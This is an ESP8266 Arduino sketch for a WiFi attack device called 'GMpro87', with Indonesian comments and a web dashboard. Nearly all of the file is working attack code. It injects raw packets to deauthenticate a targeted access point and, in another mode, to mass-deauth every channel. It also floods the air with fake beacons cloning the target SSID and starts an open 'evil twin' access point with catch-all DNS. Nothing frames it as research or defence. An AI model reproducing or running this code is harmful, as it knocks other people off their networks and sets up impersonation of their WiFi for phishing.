#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <FS.h>
#include <LittleFS.h>

// --- Definisi Internal untuk Packet Injection ---
extern "C" {
  #include "user_interface.h"
  typedef void (*freedom_outside_cb_t)(uint8_t status);
  int wifi_send_pkt_freedom(uint8_t *buf, int len, bool sys_seq);
}

// --- Struktur Data & Variabel Global ---
struct Target {
  String ssid = "";
  uint8_t bssid[6];
  int ch = 1;
};

Target target;
ESP8266WebServer server(80);
DNSServer dnsServer;

String logs = "GMpro87 System Ready...";
bool attack_deauth = false;
bool attack_mass_deauth = false;
bool attack_spam = false;
bool attack_evil = false;

int beacon_count = 15;
int current_hop_channel = 1;
unsigned long last_attack_time = 0;
unsigned long last_hop_time = 0;

// --- Fungsi Log ---
void addLog(String msg) {
  logs = "[" + String(millis()/1000) + "s] " + msg + "\n" + logs;
  if(logs.length() > 2000) logs = logs.substring(0, 2000); // Batasi memori
}

// --- Fungsi Kirim Paket Deauth (Raw) ---
void sendDeauthPacket(uint8_t* bssid, uint8_t ch) {
  uint8_t deauthPkg[26] = {
    0xC0, 0x00, 0x3A, 0x01, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID target)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00, 0x01, 0x00
  };
  memcpy(&deauthPkg[10], bssid, 6);
  memcpy(&deauthPkg[16], bssid, 6);

  wifi_set_channel(ch);
  wifi_send_pkt_freedom(deauthPkg, 26, 0);
}

// --- Fungsi Beacon Spam ---
void sendBeaconSpam() {
  if (target.ssid == "") return;
  for (int i = 0; i < beacon_count; i++) {
    uint8_t mac[6];
    for (int j = 0; j < 6; j++) mac[j] = random(256);
    mac[5] = i;

    uint8_t packet[128];
    int len = 0;
    uint8_t header[] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
    memcpy(packet, header, 10);
    memcpy(&packet[10], mac, 6); 
    memcpy(&packet[16], mac, 6);
    len += 22;
    packet[len++] = 0x00; packet[len++] = 0x00;
    uint8_t fixed[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x11, 0x04 };
    memcpy(&packet[len], fixed, 12);
    len += 12;
    packet[len++] = 0x00; 
    packet[len++] = target.ssid.length();
    for (int s = 0; s < target.ssid.length(); s++) packet[len++] = target.ssid[s];
    uint8_t rates[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, (uint8_t)target.ch };
    memcpy(&packet[len], rates, 13);
    len += 13;

    wifi_set_channel(target.ch);
    wifi_send_pkt_freedom(packet, len, 0);
    delay(1);
  }
}

// --- Web Handlers ---
void handleRoot() {
  String s = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'><title>GMpro87</title>";
  s += "<style>body{background:#000;color:#0f0;font-family:monospace;} .btn{background:#222;color:#0f0;border:1px solid #0f0;padding:10px;margin:5px;width:150px;} .btn:active{background:#0f0;color:#000;}</style></head><body>";
  s += "<h2>GMpro87 DASHBOARD</h2>";
  s += "<p>Target: " + (target.ssid == "" ? "None" : target.ssid) + " | Channel: " + String(target.ch) + "</p>";
  s += "<hr>";
  s += "<button class='btn' onclick=\"location.href='/scan'\">SCAN WIFI</button><br>";
  s += "<button class='btn' onclick=\"fetch('/attack?type=deauth')\">DEAUTH TARGET</button>";
  s += "<button class='btn' onclick=\"fetch('/attack?type=mass')\">MASS DEAUTH</button><br>";
  s += "<button class='btn' onclick=\"fetch('/attack?type=spam')\">BEACON SPAM</button>";
  s += "<button class='btn' onclick=\"fetch('/attack?type=evil')\">EVIL TWIN</button>";
  s += "<h3>LOGS:</h3><pre style='background:#111;padding:10px;height:200px;overflow:auto;'>" + logs + "</pre>";
  s += "</body></html>";
  server.send(200, "text/html", s);
}

void setup() {
  Serial.begin(115200);
  LittleFS.begin();

  // Mode AP awal untuk login Dashboard
  WiFi.softAP("GMpro87_Admin", "password123");
  addLog("AP Started: GMpro87_Admin");

  server.on("/", handleRoot);
  
  server.on("/scan", [](){
    addLog("Scanning...");
    int n = WiFi.scanNetworks();
    for (int i=0; i<n; i++) {
      if (i == 0) { // Auto select target pertama untuk demo
        target.ssid = WiFi.SSID(i);
        target.ch = WiFi.channel(i);
        memcpy(target.bssid, WiFi.BSSID(i), 6);
      }
      addLog(WiFi.SSID(i) + " (CH " + String(WiFi.channel(i)) + ")");
    }
    server.sendHeader("Location", "/");
    server.send(302, "text/plain", "Scanning...");
  });

  server.on("/attack", [](){
    String t = server.arg("type");
    if(t == "deauth") { attack_deauth = !attack_deauth; attack_mass_deauth = false; }
    if(t == "mass")   { attack_mass_deauth = !attack_mass_deauth; attack_deauth = false; }
    if(t == "spam")   { attack_spam = !attack_spam; }
    if(t == "evil") {
      attack_evil = !attack_evil;
      if(attack_evil && target.ssid != "") {
        WiFi.softAP(target.ssid.c_str()); // Buat WiFi kembar tanpa pass
        dnsServer.start(53, "*", WiFi.softAPIP());
        addLog("Evil Twin Active: " + target.ssid);
      } else {
        WiFi.softAP("GMpro87_Admin", "password123");
        dnsServer.stop();
        addLog("Evil Twin Stopped.");
      }
    }
    server.send(200, "text/plain", "OK");
  });

  server.begin();
}

void loop() {
  server.handleClient();
  if(attack_evil) dnsServer.processNextRequest();

  unsigned long currentMillis = millis();

  // 1. DEAUTH TARGET (Fokus 1 AP)
  if (attack_deauth && target.ssid != "") {
    if (currentMillis - last_attack_time > 100) {
      sendDeauthPacket(target.bssid, target.ch);
      last_attack_time = currentMillis;
    }
  }

  // 2. MASS DEAUTH (Channel Hopping)
  if (attack_mass_deauth) {
    if (currentMillis - last_hop_time > 150) {
      current_hop_channel++;
      if (current_hop_channel > 13) current_hop_channel = 1;
      wifi_set_channel(current_hop_channel);
      last_hop_time = currentMillis;
      
      uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      sendDeauthPacket(broadcast, current_hop_channel);
    }
  }

  // 3. BEACON SPAM
  if (attack_spam && target.ssid != "") {
    static unsigned long lastSpam = 0;
    if (currentMillis - lastSpam > 200) {
      sendBeaconSpam();
      lastSpam = currentMillis;
    }
  }

  yield();
}
